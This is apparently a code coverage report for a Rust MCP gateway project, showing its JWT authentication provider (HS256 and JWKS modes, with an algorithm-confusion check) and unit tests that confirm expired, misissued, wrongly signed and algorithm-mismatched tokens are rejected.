  859|      1|            enabled: false,
  860|      1|            file: None,
  861|      1|            stdout: false,
  862|      1|            export_url: None,
  863|      1|            export_headers: HashMap::new(),
  864|      1|            export_batch_size: 100,
  865|      1|            export_interval_secs: 30,
  866|      1|        };
  867|       |
  868|       |        // Test legacy with_export API
  869|      1|        let (logger, handle) = AuditLogger::with_export(&config).expect("Should create logger");
  870|      1|        assert!(handle.is_none()); // No shipper for disabled config
  871|       |
  872|      1|        logger.log_auth_success("user1");
  873|      1|    }
  874|       |
  875|       |    #[tokio::test]
  876|      1|    async fn test_audit_logger_channel_full_behavior() {
  877|      1|        let temp_file = NamedTempFile::new().expect("Should create temp file");
  878|       |
  879|      1|        let config = AuditConfig {
  880|      1|            enabled: true,
  881|      1|            file: Some(temp_file.path().to_path_buf()),
  882|      1|            stdout: false,
  883|      1|            export_url: None,
  884|      1|            export_headers: HashMap::new(),
  885|      1|            export_batch_size: 100,
  886|      1|            export_interval_secs: 30,
  887|      1|        };
  888|       |
  889|      1|        let (logger, handle) = AuditLogger::with_tasks(&config).expect("Should create logger");
  890|       |
  891|       |        // Flood the channel with many messages (channel size is 1000)
  892|       |        // This tests the try_send behavior
  893|    101|        for i in 0..100 {
                          ^100
  894|    100|            logger.log_auth_success(&format!("user{}", i));
  895|    100|        }
  896|       |
  897|       |        // Give time to process
  898|      1|        tokio::time::sleep(Duration::from_millis(200)).await;
  899|      1|        handle.shutdown().await;
  900|      1|    }
  901|       |}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/auth/jwt.rs:
    1|       |//! JWT authentication provider for mcp-guard
    2|       |//!
    3|       |//! Supports two modes:
    4|       |//! - Simple: HS256 with local secret
    5|       |//! - JWKS: RS256/ES256 with remote JWKS endpoint
    6|       |
    7|       |use async_trait::async_trait;
    8|       |
    9|       |// ============================================================================
   10|       |// Constants
   11|       |// ============================================================================
   12|       |
   13|       |/// HTTP request timeout for JWKS endpoint calls.
   14|       |/// 10 seconds allows for slow identity providers while preventing indefinite hangs.
   15|       |const JWKS_HTTP_TIMEOUT_SECS: u64 = 10;
   16|       |
   17|       |/// JWKS refresh interval as a fraction of cache duration.
   18|       |/// Refreshing at 75% of TTL ensures keys are updated before expiry while
   19|       |/// avoiding excessive network calls.
   20|       |const JWKS_REFRESH_FRACTION_NUMERATOR: u64 = 3;
   21|       |const JWKS_REFRESH_FRACTION_DENOMINATOR: u64 = 4;
   22|       |use jsonwebtoken::{
   23|       |    decode, decode_header, Algorithm, DecodingKey, Validation,
   24|       |    errors::ErrorKind as JwtErrorKind,
   25|       |};
   26|       |use std::collections::HashMap;
   27|       |use std::sync::Arc;
   28|       |use std::time::{Duration, Instant};
   29|       |use tokio::sync::RwLock;
   30|       |use tokio_util::sync::CancellationToken;
   31|       |
   32|       |use crate::auth::{map_scopes_to_tools, AuthError, AuthProvider, Identity};
   33|       |use crate::config::{JwtConfig, JwtMode};
   34|       |
   35|       |/// JWKS key entry with decoded key and algorithm
   36|       |struct JwksKey {
   37|       |    key: DecodingKey,
   38|       |    algorithm: Algorithm,
   39|       |}
   40|       |
   41|       |/// JWKS cache structure
   42|       |struct JwksCache {
   43|       |    keys: HashMap<String, JwksKey>,
   44|       |    fetched_at: Instant,
   45|       |    cache_duration: Duration,
   46|       |}
   47|       |
   48|       |impl JwksCache {
   49|      2|    fn new(cache_duration: Duration) -> Self {
   50|      2|        Self {
   51|      2|            keys: HashMap::new(),
   52|      2|            fetched_at: Instant::now() - cache_duration - Duration::from_secs(1), // Start expired
   53|      2|            cache_duration,
   54|      2|        }
   55|      2|    }
   56|       |
   57|      0|    fn is_expired(&self) -> bool {
   58|      0|        self.fetched_at.elapsed() > self.cache_duration
   59|      0|    }
   60|       |}
   61|       |
   62|       |/// JWT authentication provider
   63|       |pub struct JwtProvider {
   64|       |    config: JwtConfig,
   65|       |    /// For simple mode: pre-computed decoding key
   66|       |    simple_key: Option<DecodingKey>,
   67|       |    /// For JWKS mode: cached keys
   68|       |    jwks_cache: Option<Arc<RwLock<JwksCache>>>,
   69|       |    /// HTTP client for JWKS fetching
   70|       |    http_client: Option<reqwest::Client>,
   71|       |}
   72|       |
   73|       |impl JwtProvider {
   74|       |    /// Create a new JWT provider from configuration
   75|     31|    pub fn new(config: JwtConfig) -> Result<Self, AuthError> {
   76|     31|        match &config.mode {
   77|     29|            JwtMode::Simple { secret } => {
   78|     29|                let key = DecodingKey::from_secret(secret.as_bytes());
   79|     29|                Ok(Self {
   80|     29|                    config,
   81|     29|                    simple_key: Some(key),
   82|     29|                    jwks_cache: None,
   83|     29|                    http_client: None,
   84|     29|                })
   85|       |            }
   86|      2|            JwtMode::Jwks { cache_duration_secs, .. } => {
   87|      2|                let cache_duration = Duration::from_secs(*cache_duration_secs);
   88|      2|                let cache = Arc::new(RwLock::new(JwksCache::new(cache_duration)));
   89|      2|                let client = reqwest::Client::builder()
   90|      2|                    .timeout(Duration::from_secs(JWKS_HTTP_TIMEOUT_SECS))
   91|      2|                    .build()
   92|      2|                    .map_err(|e| AuthError::Internal(format!("Failed to create HTTP client: {}", e)))?;
                                                                   ^0      ^0                                      ^0
   93|       |
   94|      2|                Ok(Self {
   95|      2|                    config,
   96|      2|                    simple_key: None,
   97|      2|                    jwks_cache: Some(cache),
   98|      2|                    http_client: Some(client),
   99|      2|                })
  100|       |            }
  101|       |        }
  102|     31|    }
  103|       |
  104|       |    /// Start background JWKS refresh task (for JWKS mode)
  105|       |    ///
  106|       |    /// The task will run until the cancellation token is triggered.
  107|       |    /// Pass `CancellationToken::new()` if you don't need graceful shutdown.
  108|      0|    pub fn start_background_refresh(self: &Arc<Self>, cancel_token: CancellationToken) {
  109|      0|        if let JwtMode::Jwks { cache_duration_secs, .. } = &self.config.mode {
  110|      0|            let provider = Arc::clone(self);
  111|       |            // Refresh at 75% of cache duration to ensure keys are fresh before expiry
  112|      0|            let refresh_interval = Duration::from_secs(
  113|      0|                *cache_duration_secs * JWKS_REFRESH_FRACTION_NUMERATOR / JWKS_REFRESH_FRACTION_DENOMINATOR
  114|       |            );
  115|       |
  116|      0|            tokio::spawn(async move {
  117|       |                loop {
  118|      0|                    tokio::select! {
  119|      0|                        _ = cancel_token.cancelled() => {
  120|      0|                            tracing::debug!("JWKS refresh task shutting down");
  121|      0|                            break;
  122|       |                        }
  123|      0|                        _ = tokio::time::sleep(refresh_interval) => {
  124|      0|                            if let Err(e) = provider.refresh_jwks().await {
  125|      0|                                tracing::warn!(error = %e, "Background JWKS refresh failed");
  126|      0|                            }
  127|       |                        }
  128|       |                    }
  129|       |                }
  130|      0|            });
  131|      0|        }
  132|      0|    }
  133|       |
  134|       |    /// Refresh JWKS from remote endpoint
  135|      0|    async fn refresh_jwks(&self) -> Result<(), AuthError> {
  136|      0|        let JwtMode::Jwks { jwks_url, algorithms, cache_duration_secs, .. } = &self.config.mode else {
  137|      0|            return Err(AuthError::Internal("Not in JWKS mode".into()));
  138|       |        };
  139|       |
  140|      0|        let client = self.http_client.as_ref()
  141|      0|            .ok_or_else(|| AuthError::Internal("HTTP client not initialized".into()))?;
  142|       |
  143|      0|        tracing::debug!("Fetching JWKS from {}", jwks_url);
  144|       |
  145|      0|        let response = client.get(jwks_url)
  146|      0|            .send()
  147|      0|            .await
  148|      0|            .map_err(|e| AuthError::Internal(format!("JWKS fetch failed: {}", e)))?;
  149|       |
  150|      0|        if !response.status().is_success() {
  151|      0|            return Err(AuthError::Internal(format!(
  152|      0|                "JWKS endpoint returned {}", response.status()
  153|      0|            )));
  154|      0|        }
  155|       |
  156|      0|        let jwks: JwksResponse = response.json().await
  157|      0|            .map_err(|e| AuthError::Internal(format!("JWKS parse failed: {}", e)))?;
  158|       |
  159|      0|        let mut new_keys = HashMap::new();
  160|      0|        let allowed_algs: Vec<Algorithm> = algorithms.iter()
  161|      0|            .filter_map(|a| parse_algorithm(a))
  162|      0|            .collect();
  163|       |
  164|      0|        for key in jwks.keys {
  165|      0|            let Some(kid) = key.kid else { continue };
  166|      0|            let Some(alg) = key.alg.as_ref().and_then(|a| parse_algorithm(a)) else { continue };
  167|       |
  168|      0|            if !allowed_algs.contains(&alg) {
  169|      0|                continue;
  170|      0|            }
  171|       |
  172|      0|            let decoding_key = match (&key.kty[..], &key.n, &key.e, &key.x, &key.y) {
  173|       |                // RSA key
  174|      0|                ("RSA", Some(n), Some(e), _, _) => {
  175|      0|                    DecodingKey::from_rsa_components(n, e)
  176|      0|                        .map_err(|e| AuthError::Internal(format!("Invalid RSA key: {}", e)))?
  177|       |                }
  178|       |                // EC key
  179|      0|                ("EC", _, _, Some(x), Some(y)) => {
  180|      0|                    DecodingKey::from_ec_components(x, y)
  181|      0|                        .map_err(|e| AuthError::Internal(format!("Invalid EC key: {}", e)))?
  182|       |                }
  183|      0|                _ => continue, // Skip unsupported key types
  184|       |            };
  185|       |
  186|      0|            new_keys.insert(kid, JwksKey {
  187|      0|                key: decoding_key,
  188|      0|                algorithm: alg,
  189|      0|            });
  190|       |        }
  191|       |
  192|      0|        if new_keys.is_empty() {
  193|      0|            return Err(AuthError::Internal("No valid keys found in JWKS".into()));
  194|      0|        }
  195|       |
  196|       |        // Update cache
  197|      0|        let cache = self.jwks_cache.as_ref()
  198|      0|            .ok_or_else(|| AuthError::Internal("JWKS cache not initialized".into()))?;
  199|       |
  200|      0|        let mut cache_guard = cache.write().await;
  201|      0|        cache_guard.keys = new_keys;
  202|      0|        cache_guard.fetched_at = Instant::now();
  203|      0|        cache_guard.cache_duration = Duration::from_secs(*cache_duration_secs);
  204|       |
  205|      0|        tracing::info!("JWKS cache refreshed with {} keys", cache_guard.keys.len());
  206|      0|        Ok(())
  207|      0|    }
  208|       |
  209|       |    /// Get decoding key for a given kid (JWKS mode)
  210|      0|    async fn get_jwks_key(&self, kid: &str) -> Result<(DecodingKey, Algorithm), AuthError> {
  211|      0|        let cache = self.jwks_cache.as_ref()
  212|      0|            .ok_or_else(|| AuthError::Internal("JWKS cache not initialized".into()))?;
  213|       |
  214|       |        // Check if cache needs refresh
  215|       |        {
  216|      0|            let cache_guard = cache.read().await;
  217|      0|            if cache_guard.is_expired() {
  218|      0|                drop(cache_guard);
  219|      0|                self.refresh_jwks().await?;
  220|      0|            }
  221|       |        }
  222|       |
  223|       |        // Get key from cache
  224|      0|        let cache_guard = cache.read().await;
  225|      0|        cache_guard.keys.get(kid)
  226|      0|            .map(|k| (k.key.clone(), k.algorithm))
  227|      0|            .ok_or_else(|| AuthError::InvalidJwt(format!("Unknown key ID: {}", kid)))
  228|      0|    }
  229|       |
  230|       |    /// Build validation parameters
  231|     22|    fn build_validation(&self, algorithm: Algorithm) -> Validation {
  232|     22|        let mut validation = Validation::new(algorithm);
  233|     22|        validation.set_issuer(&[&self.config.issuer]);
  234|     22|        validation.set_audience(&[&self.config.audience]);
  235|     22|        validation.leeway = self.config.leeway_secs;
  236|     22|        validation
  237|     22|    }
  238|       |
  239|       |    /// Extract scopes from token claims
  240|     11|    fn extract_scopes(&self, claims: &HashMap<String, serde_json::Value>) -> Vec<String> {
  241|     11|        claims
  242|     11|            .get(&self.config.scopes_claim)
  243|     11|            .map(|v| match v {
                                         ^5
  244|       |                // Space-separated string (OAuth2 style)
  245|      3|                serde_json::Value::String(s) => {
  246|      3|                    s.split_whitespace().map(String::from).collect()
  247|       |                }
  248|       |                // Array of strings
  249|      2|                serde_json::Value::Array(arr) => {
  250|      2|                    arr.iter()
  251|      4|                        .filter_map(|v| v.as_str())
                                       ^2
  252|      2|                        .map(String::from)
  253|      2|                        .collect()
  254|       |                }
  255|      0|                _ => vec![],
  256|      5|            })
  257|     11|            .unwrap_or_default()
  258|     11|    }
  259|       |}
  260|       |
  261|       |#[async_trait]
  262|       |impl AuthProvider for JwtProvider {
  263|     29|    async fn authenticate(&self, token: &str) -> Result<Identity, AuthError> {
  264|       |        // Decode header to get algorithm and kid
  265|       |        let header = decode_header(token)
  266|      3|            .map_err(|e| AuthError::InvalidJwt(format!("Invalid JWT header: {}", e)))?;
  267|       |
  268|       |        // Get decoding key and algorithm based on mode
  269|       |        let (decoding_key, algorithm) = match &self.config.mode {
  270|       |            JwtMode::Simple { .. } => {
  271|       |                let key = self.simple_key.as_ref()
  272|      0|                    .ok_or_else(|| AuthError::Internal("Simple key not initialized".into()))?;
  273|       |                (key.clone(), Algorithm::HS256)
  274|       |            }
  275|       |            JwtMode::Jwks { .. } => {
  276|       |                let kid = header.kid.as_ref()
  277|      1|                    .ok_or_else(|| AuthError::InvalidJwt("JWT missing 'kid' header".into()))?;
  278|       |                self.get_jwks_key(kid).await?
  279|       |            }
  280|       |        };
  281|       |
  282|       |        // SECURITY: Validate algorithm matches to prevent algorithm confusion attacks.
  283|       |        // In Simple mode, reject any token not using HS256 (prevents 'none' algorithm attack).
  284|       |        // In JWKS mode, ensure the token's alg matches the key's expected algorithm.
  285|       |        if header.alg != algorithm {
  286|       |            tracing::warn!(
  287|       |                expected_alg = ?algorithm,
  288|       |                claimed_alg = ?header.alg,
  289|       |                "JWT algorithm mismatch - possible algorithm confusion attack"
  290|       |            );
  291|       |            return Err(AuthError::InvalidJwt(format!(
  292|       |                "Algorithm mismatch: expected {:?}, got {:?}",
  293|       |                algorithm, header.alg
  294|       |            )));
  295|       |        }
  296|       |
  297|       |        // Build validation and decode
  298|       |        let validation = self.build_validation(algorithm);
  299|       |        let token_data = decode::<HashMap<String, serde_json::Value>>(
  300|       |            token,
  301|       |            &decoding_key,
  302|       |            &validation,
  303|      8|        ).map_err(|e| {
  304|      8|            match e.kind() {
  305|      2|                JwtErrorKind::ExpiredSignature => AuthError::TokenExpired,
  306|      2|                JwtErrorKind::InvalidIssuer => AuthError::InvalidJwt("Invalid issuer".into()),
  307|      2|                JwtErrorKind::InvalidAudience => AuthError::InvalidJwt("Invalid audience".into()),
  308|      2|                _ => AuthError::InvalidJwt(format!("JWT validation failed: {}", e)),
  309|       |            }
  310|      8|        })?;
  311|       |
  312|       |        // Extract user ID
  313|       |        let user_id = token_data.claims
  314|       |            .get(&self.config.user_id_claim)
  315|     11|            .and_then(|v| v.as_str())
  316|      3|            .ok_or_else(|| AuthError::InvalidJwt(format!(
  317|      3|                "Missing '{}' claim", self.config.user_id_claim
  318|       |            )))?
  319|       |            .to_string();
  320|       |
  321|       |        // Extract scopes and map to tools
  322|       |        let scopes = self.extract_scopes(&token_data.claims);
  323|       |        let allowed_tools = map_scopes_to_tools(&scopes, &self.config.scope_tool_mapping);
  324|       |
  325|       |        // Extract optional name
  326|       |        let name = token_data.claims
  327|       |            .get("name")
  328|      2|            .and_then(|v| v.as_str())
  329|       |            .map(String::from);
  330|       |
  331|       |        Ok(Identity {
  332|       |            id: user_id,
  333|       |            name,
  334|       |            allowed_tools,
  335|       |            rate_limit: None, // Could be extracted from claims if needed
  336|       |            claims: token_data.claims,
  337|       |        })
  338|     29|    }
  339|       |
  340|      1|    fn name(&self) -> &str {
  341|      1|        "jwt"
  342|      1|    }
  343|       |}
  344|       |
  345|       |// Helper types for JWKS parsing
  346|       |#[derive(Debug, serde::Deserialize)]
  347|       |struct JwksResponse {
  348|       |    keys: Vec<JwksKeyEntry>,
  349|       |}
  350|       |
  351|       |#[derive(Debug, serde::Deserialize)]
  352|       |struct JwksKeyEntry {
  353|       |    kid: Option<String>,
  354|       |    kty: String,
  355|       |    alg: Option<String>,
  356|       |    #[serde(rename = "use")]
  357|       |    #[allow(dead_code)]
  358|       |    key_use: Option<String>,
  359|       |    // RSA components
  360|       |    n: Option<String>,
  361|       |    e: Option<String>,
  362|       |    // EC components
  363|       |    x: Option<String>,
  364|       |    y: Option<String>,
  365|       |    #[allow(dead_code)]
  366|       |    crv: Option<String>,
  367|       |}
  368|       |
  369|      0|fn parse_algorithm(alg: &str) -> Option<Algorithm> {
  370|      0|    match alg {
  371|      0|        "HS256" => Some(Algorithm::HS256),
  372|      0|        "HS384" => Some(Algorithm::HS384),
  373|      0|        "HS512" => Some(Algorithm::HS512),
  374|      0|        "RS256" => Some(Algorithm::RS256),
  375|      0|        "RS384" => Some(Algorithm::RS384),
  376|      0|        "RS512" => Some(Algorithm::RS512),
  377|      0|        "ES256" => Some(Algorithm::ES256),
  378|      0|        "ES384" => Some(Algorithm::ES384),
  379|      0|        _ => None,
  380|       |    }
  381|      0|}
  382|       |
  383|       |#[cfg(test)]
  384|       |mod tests {
  385|       |    use super::*;
  386|       |    use base64::Engine;
  387|       |    use jsonwebtoken::{encode, EncodingKey, Header};
  388|       |    use std::time::{SystemTime, UNIX_EPOCH};
  389|       |
  390|       |    const TEST_SECRET: &str = "test-secret-key-at-least-32-characters-long";
  391|       |
  392|     11|    fn create_simple_provider() -> JwtProvider {
  393|     11|        let config = JwtConfig {
  394|     11|            mode: JwtMode::Simple {
  395|     11|                secret: TEST_SECRET.to_string(),
  396|     11|            },
  397|     11|            issuer: "test-issuer".to_string(),
  398|     11|            audience: "test-audience".to_string(),
  399|     11|            user_id_claim: "sub".to_string(),
  400|     11|            scopes_claim: "scope".to_string(),
  401|     11|            scope_tool_mapping: HashMap::new(),
  402|     11|            leeway_secs: 0,
  403|     11|        };
  404|     11|        JwtProvider::new(config).unwrap()
  405|     11|    }
  406|       |
  407|     10|    fn create_test_token(claims: &HashMap<String, serde_json::Value>) -> String {
  408|     10|        let header = Header::new(Algorithm::HS256);
  409|     10|        encode(&header, claims, &EncodingKey::from_secret(TEST_SECRET.as_bytes())).unwrap()
  410|     10|    }
  411|       |
  412|     15|    fn now_secs() -> i64 {
  413|     15|        SystemTime::now()
  414|     15|            .duration_since(UNIX_EPOCH)
  415|     15|            .unwrap()
  416|     15|            .as_secs() as i64
  417|     15|    }
  418|       |
  419|       |    #[tokio::test]
  420|      1|    async fn test_valid_token() {
  421|      1|        let provider = create_simple_provider();
  422|      1|        let now = now_secs();
  423|       |
  424|      1|        let mut claims = HashMap::new();
  425|      1|        claims.insert("sub".to_string(), serde_json::json!("user123"));
  426|      1|        claims.insert("iss".to_string(), serde_json::json!("test-issuer"));
  427|      1|        claims.insert("aud".to_string(), serde_json::json!("test-audience"));
  428|      1|        claims.insert("exp".to_string(), serde_json::json!(now + 3600));
  429|      1|        claims.insert("iat".to_string(), serde_json::json!(now));
  430|       |
  431|      1|        let token = create_test_token(&claims);
  432|      1|        let result = provider.authenticate(&token).await;
  433|       |
  434|      1|        assert!(result.is_ok());
  435|      1|        let identity = result.unwrap();
  436|      1|        assert_eq!(identity.id, "user123");
  437|      1|        assert!(identity.allowed_tools.is_none()); // No scope mapping = all allowed
  438|      1|    }
  439|       |
  440|       |    #[tokio::test]
  441|      1|    async fn test_expired_token() {
  442|      1|        let provider = create_simple_provider();
  443|      1|        let now = now_secs();
  444|       |
  445|      1|        let mut claims = HashMap::new();
  446|      1|        claims.insert("sub".to_string(), serde_json::json!("user123"));
  447|      1|        claims.insert("iss".to_string(), serde_json::json!("test-issuer"));
  448|      1|        claims.insert("aud".to_string(), serde_json::json!("test-audience"));
  449|      1|        claims.insert("exp".to_string(), serde_json::json!(now - 3600)); // Expired
  450|      1|        claims.insert("iat".to_string(), serde_json::json!(now - 7200));
  451|       |
  452|      1|        let token = create_test_token(&claims);
  453|      1|        let result = provider.authenticate(&token).await;
  454|       |
  455|      1|        assert!(matches!(result, Err(AuthError::TokenExpired)));
                              ^0
  456|      1|    }
  457|       |
  458|       |    #[tokio::test]
  459|      1|    async fn test_invalid_issuer() {
  460|      1|        let provider = create_simple_provider();
  461|      1|        let now = now_secs();
  462|       |
  463|      1|        let mut claims = HashMap::new();
  464|      1|        claims.insert("sub".to_string(), serde_json::json!("user123"));
  465|      1|        claims.insert("iss".to_string(), serde_json::json!("wrong-issuer"));
  466|      1|        claims.insert("aud".to_string(), serde_json::json!("test-audience"));
  467|      1|        claims.insert("exp".to_string(), serde_json::json!(now + 3600));
  468|       |
  469|      1|        let token = create_test_token(&claims);
  470|      1|        let result = provider.authenticate(&token).await;
  471|       |
  472|      1|        assert!(matches!(result, Err(AuthError::InvalidJwt(_))));
                              ^0
  473|      1|    }
  474|       |
  475|       |    #[tokio::test]
  476|      1|    async fn test_invalid_audience() {
  477|      1|        let provider = create_simple_provider();
  478|      1|        let now = now_secs();
  479|       |
  480|      1|        let mut claims = HashMap::new();
  481|      1|        claims.insert("sub".to_string(), serde_json::json!("user123"));
  482|      1|        claims.insert("iss".to_string(), serde_json::json!("test-issuer"));
  483|      1|        claims.insert("aud".to_string(), serde_json::json!("wrong-audience"));
  484|      1|        claims.insert("exp".to_string(), serde_json::json!(now + 3600));
  485|       |
  486|      1|        let token = create_test_token(&claims);
  487|      1|        let result = provider.authenticate(&token).await;
  488|       |
  489|      1|        assert!(matches!(result, Err(AuthError::InvalidJwt(_))));
                              ^0
  490|      1|    }
  491|       |
  492|       |    #[tokio::test]
  493|      1|    async fn test_invalid_signature() {
  494|      1|        let provider = create_simple_provider();
  495|      1|        let now = now_secs();
  496|       |
  497|      1|        let mut claims = HashMap::new();
  498|      1|        claims.insert("sub".to_string(), serde_json::json!("user123"));
  499|      1|        claims.insert("iss".to_string(), serde_json::json!("test-issuer"));
  500|      1|        claims.insert("aud".to_string(), serde_json::json!("test-audience"));
  501|      1|        claims.insert("exp".to_string(), serde_json::json!(now + 3600));
  502|       |
  503|       |        // Sign with wrong secret
  504|      1|        let header = Header::new(Algorithm::HS256);
  505|      1|        let token = encode(&header, &claims, &EncodingKey::from_secret(b"wrong-secret")).unwrap();
  506|       |
  507|      1|        let result = provider.authenticate(&token).await;
  508|      1|        assert!(matches!(result, Err(AuthError::InvalidJwt(_))));
                              ^0
  509|      1|    }
  510|       |
  511|       |    #[tokio::test]
  512|      1|    async fn test_missing_sub_claim() {
  513|      1|        let provider = create_simple_provider();
  514|      1|        let now = now_secs();
  515|       |
  516|      1|        let mut claims = HashMap::new();
  517|       |        // No "sub" claim
  518|      1|        claims.insert("iss".to_string(), serde_json::json!("test-issuer"));
  519|      1|        claims.insert("aud".to_string(), serde_json::json!("test-audience"));
  520|      1|        claims.insert("exp".to_string(), serde_json::json!(now + 3600));
  521|       |
  522|      1|        let token = create_test_token(&claims);
  523|      1|        let result = provider.authenticate(&token).await;
  524|       |
  525|      1|        assert!(matches!(result, Err(AuthError::InvalidJwt(_))));
                              ^0
  526|      1|    }
  527|       |
  528|       |    #[tokio::test]
  529|      1|    async fn test_scope_extraction_string() {
  530|      1|        let mut scope_mapping = HashMap::new();
  531|      1|        scope_mapping.insert("read:files".to_string(), vec!["read_file".to_string()]);
  532|      1|        scope_mapping.insert("write:files".to_string(), vec!["write_file".to_string()]);
  533|       |
  534|      1|        let config = JwtConfig {
  535|      1|            mode: JwtMode::Simple {
  536|      1|                secret: TEST_SECRET.to_string(),
  537|      1|            },
  538|      1|            issuer: "test-issuer".to_string(),
  539|      1|            audience: "test-audience".to_string(),
  540|      1|            user_id_claim: "sub".to_string(),
  541|      1|            scopes_claim: "scope".to_string(),
  542|      1|            scope_tool_mapping: scope_mapping,
  543|      1|            leeway_secs: 0,
  544|      1|        };
  545|      1|        let provider = JwtProvider::new(config).unwrap();
  546|       |
  547|      1|        let now = now_secs();
  548|      1|        let mut claims = HashMap::new();
  549|      1|        claims.insert("sub".to_string(), serde_json::json!("user123"));
  550|      1|        claims.insert("iss".to_string(), serde_json::json!("test-issuer"));
  551|      1|        claims.insert("aud".to_string(), serde_json::json!("test-audience"));
  552|      1|        claims.insert("exp".to_string(), serde_json::json!(now + 3600));
  553|      1|        claims.insert("scope".to_string(), serde_json::json!("read:files write:files"));
  554|       |
  555|      1|        let token = create_test_token(&claims);
  556|      1|        let result = provider.authenticate(&token).await;
  557|       |
  558|      1|        assert!(result.is_ok());
  559|      1|        let identity = result.unwrap();
  560|      1|        let tools = identity.allowed_tools.unwrap();
  561|      1|        assert!(tools.contains(&"read_file".to_string()));
  562|      1|        assert!(tools.contains(&"write_file".to_string()));
  563|      1|    }
  564|       |
  565|       |    #[tokio::test]
  566|      1|    async fn test_scope_extraction_array() {
  567|      1|        let mut scope_mapping = HashMap::new();
  568|      1|        scope_mapping.insert("admin".to_string(), vec!["*".to_string()]);
  569|       |
  570|      1|        let config = JwtConfig {
  571|      1|            mode: JwtMode::Simple {
  572|      1|                secret: TEST_SECRET.to_string(),
  573|      1|            },
  574|      1|            issuer: "test-issuer".to_string(),
  575|      1|            audience: "test-audience".to_string(),
  576|      1|            user_id_claim: "sub".to_string(),
  577|      1|            scopes_claim: "permissions".to_string(), // Array style
  578|      1|            scope_tool_mapping: scope_mapping,
  579|      1|            leeway_secs: 0,
  580|      1|        };
  581|      1|        let provider = JwtProvider::new(config).unwrap();
  582|       |
  583|      1|        let now = now_secs();
  584|      1|        let mut claims = HashMap::new();
  585|      1|        claims.insert("sub".to_string(), serde_json::json!("admin-user"));
  586|      1|        claims.insert("iss".to_string(), serde_json::json!("test-issuer"));
  587|      1|        claims.insert("aud".to_string(), serde_json::json!("test-audience"));
  588|      1|        claims.insert("exp".to_string(), serde_json::json!(now + 3600));
  589|      1|        claims.insert("permissions".to_string(), serde_json::json!(["admin", "read"]));
  590|       |
  591|      1|        let token = create_test_token(&claims);
  592|      1|        let result = provider.authenticate(&token).await;
  593|       |
  594|      1|        assert!(result.is_ok());
  595|      1|        let identity = result.unwrap();
  596|      1|        assert!(identity.allowed_tools.is_none()); // Wildcard = all allowed
  597|      1|    }
  598|       |
  599|       |    #[tokio::test]
  600|      1|    async fn test_unknown_scope() {
  601|      1|        let mut scope_mapping = HashMap::new();
  602|      1|        scope_mapping.insert("read:files".to_string(), vec!["read_file".to_string()]);
  603|       |
  604|      1|        let config = JwtConfig {
  605|      1|            mode: JwtMode::Simple {
  606|      1|                secret: TEST_SECRET.to_string(),
  607|      1|            },
  608|      1|            issuer: "test-issuer".to_string(),
  609|      1|            audience: "test-audience".to_string(),
  610|      1|            user_id_claim: "sub".to_string(),
  611|      1|            scopes_claim: "scope".to_string(),
  612|      1|            scope_tool_mapping: scope_mapping,
  613|      1|            leeway_secs: 0,
  614|      1|        };
  615|      1|        let provider = JwtProvider::new(config).unwrap();
  616|       |
  617|      1|        let now = now_secs();
  618|      1|        let mut claims = HashMap::new();
  619|      1|        claims.insert("sub".to_string(), serde_json::json!("user123"));
  620|      1|        claims.insert("iss".to_string(), serde_json::json!("test-issuer"));
  621|      1|        claims.insert("aud".to_string(), serde_json::json!("test-audience"));
  622|      1|        claims.insert("exp".to_string(), serde_json::json!(now + 3600));
  623|      1|        claims.insert("scope".to_string(), serde_json::json!("unknown:scope"));
  624|       |
  625|      1|        let token = create_test_token(&claims);
  626|      1|        let result = provider.authenticate(&token).await;
  627|       |
  628|      1|        assert!(result.is_ok());
  629|      1|        let identity = result.unwrap();
  630|      1|        assert_eq!(identity.allowed_tools, Some(vec![])); // Empty = no tools allowed
  631|      1|    }
  632|       |
  633|       |    #[tokio::test]
  634|      1|    async fn test_name_extraction() {
  635|      1|        let provider = create_simple_provider();
  636|      1|        let now = now_secs();
  637|       |
  638|      1|        let mut claims = HashMap::new();
  639|      1|        claims.insert("sub".to_string(), serde_json::json!("user123"));
  640|      1|        claims.insert("name".to_string(), serde_json::json!("John Doe"));
  641|      1|        claims.insert("iss".to_string(), serde_json::json!("test-issuer"));
  642|      1|        claims.insert("aud".to_string(), serde_json::json!("test-audience"));
  643|      1|        claims.insert("exp".to_string(), serde_json::json!(now + 3600));
  644|       |
  645|      1|        let token = create_test_token(&claims);
  646|      1|        let result = provider.authenticate(&token).await;
  647|       |
  648|      1|        assert!(result.is_ok());
  649|      1|        let identity = result.unwrap();
  650|      1|        assert_eq!(identity.name, Some("John Doe".to_string()));
  651|      1|    }
  652|       |
  653|       |    #[tokio::test]
  654|      1|    async fn test_alg_mismatch_simple_mode() {
  655|      1|        let provider = create_simple_provider();
  656|      1|        let now = now_secs();
  657|       |        
  658|      1|        let mut claims = HashMap::new();
  659|      1|        claims.insert("sub".to_string(), serde_json::json!("user123"));
  660|      1|        claims.insert("iss".to_string(), serde_json::json!("test-issuer"));
  661|      1|        claims.insert("aud".to_string(), serde_json::json!("test-audience"));
  662|      1|        claims.insert("exp".to_string(), serde_json::json!(now + 3600));
  663|       |
  664|       |        // Create token signed with RS256 (simulated by just using wrong header)
  665|       |        // Note: We can't actually sign with RS256 without a key, 
  666|       |        // but we can sign with HS256 and LIE in the header about the algorithm.
  667|       |        // Or we can just use HS512.
  668|      1|        let header = Header::new(Algorithm::HS512);
  669|      1|        let token = encode(&header, &claims, &EncodingKey::from_secret(TEST_SECRET.as_bytes())).unwrap();
  670|       |
  671|      1|        let result = provider.authenticate(&token).await;
  672|       |        // Should fail because validation expects HS256
  673|      1|        assert!(result.is_err());
  674|      1|        assert!(matches!(result.unwrap_err(), AuthError::InvalidJwt(_)));
                              ^0
  675|      1|    }
  676|       |
  677|       |    #[tokio::test]
  678|      1|    async fn test_missing_custom_claim() {
  679|      1|        let config = JwtConfig {
  680|      1|            mode: JwtMode::Simple {
  681|      1|                secret: TEST_SECRET.to_string(),
  682|      1|            },
  683|      1|            issuer: "test-issuer".to_string(),
  684|      1|            audience: "test-audience".to_string(),
  685|      1|            user_id_claim: "custom_id".to_string(), // Expects "custom_id"
  686|      1|            scopes_claim: "scope".to_string(),
  687|      1|            scope_tool_mapping: HashMap::new(),
  688|      1|            leeway_secs: 0,
  689|      1|        };
  690|      1|        let provider = JwtProvider::new(config).unwrap();
  691|       |        
  692|      1|        let now = now_secs();
  693|      1|        let mut claims = HashMap::new();
  694|       |        // Provide "sub" but not "custom_id"
  695|      1|        claims.insert("sub".to_string(), serde_json::json!("user123"));
  696|      1|        claims.insert("iss".to_string(), serde_json::json!("test-issuer"));
  697|      1|        claims.insert("aud".to_string(), serde_json::json!("test-audience"));
